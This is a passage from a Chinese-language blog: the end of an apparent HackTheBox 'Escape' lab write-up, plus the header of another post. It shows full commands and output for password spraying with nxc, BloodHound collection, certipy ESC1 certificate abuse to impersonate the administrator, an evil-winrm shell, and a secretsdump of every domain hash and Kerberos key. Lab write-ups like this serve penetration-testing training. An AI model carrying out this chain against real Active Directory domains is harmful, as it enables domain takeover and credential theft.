<p>又要成盯真了<br>用<strong>NuclearMosquito3</strong>喷射一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;NuclearMosquito3&quot;</span> --continue-on-success</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\sql_svc:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line"></span><br><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;NuclearMosquito3&quot;</span> --continue-on-success</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\krbtgt:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\sql_svc:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:NuclearMosquito3</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-Ryan-Cooper"><a href="#shell-as-Ryan-Cooper" class="headerlink" title="shell as Ryan.Cooper"></a>shell as Ryan.Cooper</h2><p>（这里先去装一下bloodhound-ce）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d sequel.htb -u ryan.cooper -p <span class="string">&quot;NuclearMosquito3&quot;</span> -c all -ns 10.129.228.253 --zip   </span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: sequel.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: dc.sequel.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.sequel.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 53 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.sequel.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 25S</span><br><span class="line">INFO: Compressing output into 20250430163207_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>导进去看一下<br><img src="/images/escape-3.png"><br>真乱呀</p>
<h3 id="ESC1-classic-abuse"><a href="#ESC1-classic-abuse" class="headerlink" title="ESC1 classic abuse"></a>ESC1 classic abuse</h3><p>看下证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ certipy find -u ryan.cooper@sequel.htb -p <span class="string">&quot;NuclearMosquito3&quot;</span>  -dc-ip 10.129.228.253</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span></span><br><span class="line">[*] Saved BloodHound data to <span class="string">&#x27;20250430164217_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20250430164217_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saved JSON output to <span class="string">&#x27;20250430164217_Certipy.json&#x27;</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> 20250430164217_Certipy.tx</span><br><span class="line">0                                                                                                                                                                            16:42:48 [1082/5078]</span><br><span class="line">    Template Name                       : UserAuthentication                                                                                                                                       </span><br><span class="line">    Display Name                        : UserAuthentication                                                                                                                                       </span><br><span class="line">    Certificate Authorities             : sequel-DC-CA                                                                                                                                             </span><br><span class="line">    Enabled                             : True                                                                                                                                                     </span><br><span class="line">    Client Authentication               : True                                                                                                                                                     </span><br><span class="line">    Enrollment Agent                    : False                                                                                                                                                    </span><br><span class="line">    Any Purpose                         : False                                                                                                                                                    </span><br><span class="line">    Enrollee Supplies Subject           : True                                                                                                                                                     </span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                                                                  </span><br><span class="line">    Enrollment Flag                     : PublishToDs                                                                                                                                              </span><br><span class="line">                                          IncludeSymmetricAlgorithms                                                                                                                               </span><br><span class="line">    Private Key Flag                    : ExportableKey                                                                                                                                            </span><br><span class="line">    Extended Key Usage                  : Client Authentication                                                                                                                                    </span><br><span class="line">                                          Secure Email                                                                                                                                             </span><br><span class="line">                                          Encrypting File System                                                                                                                                   </span><br><span class="line">    Requires Manager Approval           : False                                                                                                                                                    </span><br><span class="line">    Requires Key Archival               : False                                                                                                                                                    </span><br><span class="line">    Authorized Signatures Required      : 0                                                                                                                                                        </span><br><span class="line">    Validity Period                     : 10 years                                                                                                                                                 </span><br><span class="line">    Renewal Period                      : 6 weeks                                                                                                                                                  </span><br><span class="line">    Minimum RSA Key Length              : 2048                                                                                                                                                     </span><br><span class="line">    Permissions                                                                                                                                                                                    </span><br><span class="line">      Enrollment Permissions                                                                                                                                                                       </span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Domain Users                                                                                                                                  </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">      Object Control Permissions                                                                                                                                                                   </span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">    [!] Vulnerabilities                                                                                                                                                                            </span><br><span class="line">      ESC1                              : <span class="string">&#x27;SEQUEL.HTB\\Domain Users&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication    </span><br></pre></td></tr></table></figure>
<p>给了一个ESC1的滥用<br>求一张</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ certipy req -ca sequel-DC-CA -template UserAuthentication -dc-ip 10.129.228.253 -target dc.sequel.htb -u ryan.cooper -p <span class="string">&quot;NuclearMosquito3&quot;</span> -ns 10.129.228.253 -upn administrator@sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 18</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ certipy auth -pfx administrator.pfx </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> evil-winrm -i dc.sequel.htb -u administrator -H <span class="string">&quot;a52f78e4c751e5f5e17e1e9f3e58f4ee&quot;</span>                                 </span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        4/30/2025   7:55 AM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">ba6b161dc83e8556b828d1a9017c2c87</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br></pre></td></tr></table></figure>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -k -no-pass sequel.htb/administrator@dc.sequel.htb             </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra                                                         </span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state                                                   </span><br><span class="line">[*] Starting service RemoteRegistry                                                              </span><br><span class="line">[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d                                  </span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)               </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cbf36a6101cb1a15e11f776ec6d5d77b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                     </span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)                                                                                                                                 </span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets                                                                          </span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC                                                                                 </span></span><br><span class="line"><span class="string">sequel\DC$:plain_password_hex:cc9d5ea540f6ae97c66daeedd41fe8ecaf6cee114ac8eaf357da86e1ce2fa2987fc73fd54a5db4e07d16bd9e83275f6484e592610cc294f3f683793b2653e842067a03d96a1bd83cbe33ad48f4d8e4555a44b</span></span><br><span class="line"><span class="string">0bb95fa5f36af8f6ca77064f2985e3a3e08925d7d19c686f93b9b69d4a1ab348e92d61e242d3c4d636ae57e7e0766f095526dcf5ef85a64cf5cd213e04ecde1aa86706ea1a36e77a0ed94e0c869efa288d5b47e6874885969f180b029cd3ead8e2e</span></span><br><span class="line"><span class="string">e128b6f80b83f9500fb7e4e0dbc340e74bf43caaf5d0f103fcf73eed686661ff104ba1a1498fc0586fa208364bb4c8483de977525db1b3bebef96e86</span></span><br><span class="line"><span class="string">sequel\DC$:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::      </span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM                                                                                 </span></span><br><span class="line"><span class="string">dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd                                      </span></span><br><span class="line"><span class="string">dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931                                                                                                                                           </span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.</span></span><br><span class="line"><span class="string"> 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..</span></span><br><span class="line"><span class="string"> 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...</span></span><br><span class="line"><span class="string"> 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..</span></span><br><span class="line"><span class="string">NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac</span></span><br><span class="line"><span class="string">[*] _SC_MSSQL$SQLMOCK </span></span><br><span class="line"><span class="string">sequel\sql_svc:REGGIE1234ronnie</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::</span></span><br><span class="line"><span class="string">Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::</span></span><br><span class="line"><span class="string">Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::</span></span><br><span class="line"><span class="string">Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::</span></span><br><span class="line"><span class="string">sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::</span></span><br><span class="line"><span class="string">James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::</span></span><br><span class="line"><span class="string">Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:0ba0bb35571c5d0e19849c9c2b92539a4ce6a8fd3dd6348fb6a0888797dedd16</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:37cbf2133cdec2b7e5531957a21e791f</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:5d76e0d3c245a2a4</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:b3f74f6e968fb5d2cf17f36f417bc46259623626953ed30f8faf3cd00b91c8de</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:919e6861b6306e3367a9223a154473ec</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:6d1f1cd391e01a91</span></span><br><span class="line"><span class="string">Tom.Henn:aes256-cts-hmac-sha1-96:bb3886d7e3201d11055cf8a2ef587d83b448d33d77aab36dd84b4ce8c59fc0a2 </span></span><br><span class="line"><span class="string">Tom.Henn:aes128-cts-hmac-sha1-96:0a221bf0f01f109c86cc1668783b80d3</span></span><br><span class="line"><span class="string">Tom.Henn:des-cbc-md5:1a46dc3858150401</span></span><br><span class="line"><span class="string">Brandon.Brown:aes256-cts-hmac-sha1-96:1aad383c76610c43bf638873ff5d7f0d7cd5cffccdfb6dd16754f15b83217550</span></span><br><span class="line"><span class="string">Brandon.Brown:aes128-cts-hmac-sha1-96:cb92957a61468212c2e1f26f2958b892</span></span><br><span class="line"><span class="string">Brandon.Brown:des-cbc-md5:91b3a13edf6e6201</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes256-cts-hmac-sha1-96:b9a2b7df6161b9a31a15cfbbb17f68a5b3904eaa2ea21d8ed2ef9acb5e27b997</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes128-cts-hmac-sha1-96:cbe89554da97001fa8fd0967f1799104</span></span><br><span class="line"><span class="string">Ryan.Cooper:des-cbc-md5:f4a445754f540104</span></span><br><span class="line"><span class="string">sql_svc:aes256-cts-hmac-sha1-96:bcbbff82091c7c6f9875261d3ada97274d01b4a1f93ceb16e8154606e392a4ae</span></span><br><span class="line"><span class="string">sql_svc:aes128-cts-hmac-sha1-96:decddf91c717c5a5b84e112f576ece3b</span></span><br><span class="line"><span class="string">sql_svc:des-cbc-md5:73ae15efdafe751f</span></span><br><span class="line"><span class="string">James.Roberts:aes256-cts-hmac-sha1-96:d503bb2c7eea7bf50e7f68ca967e4a6f8a903b22cffa07cf2c160580156f8a43</span></span><br><span class="line"><span class="string">James.Roberts:aes128-cts-hmac-sha1-96:33c8d3d907cd51ffa5274ce0b16ba448</span></span><br><span class="line"><span class="string">James.Roberts:des-cbc-md5:e53de99770a20bf2</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes256-cts-hmac-sha1-96:fd75cd1b02ed4cb838c996db6d7616157d19545c60fb23156abdb3a400bc371c</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes128-cts-hmac-sha1-96:0c86380c787deb624027e9d1d8d71ab2</span></span><br><span class="line"><span class="string">Nicole.Thompson:des-cbc-md5:31b5e386b33e2589</span></span><br><span class="line"><span class="string">DC$:aes256-cts-hmac-sha1-96:7273137e3dec6556a5bdf7757e263b1c50320c00d5b0fff30b2dd4b01543c695</span></span><br><span class="line"><span class="string">DC$:aes128-cts-hmac-sha1-96:e7c64e545316e8cb28c860f10705e2bf</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:2ae0f438f4b97623</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>


    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/">HackTheBox——HTB Environment Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/environment.png"></p>
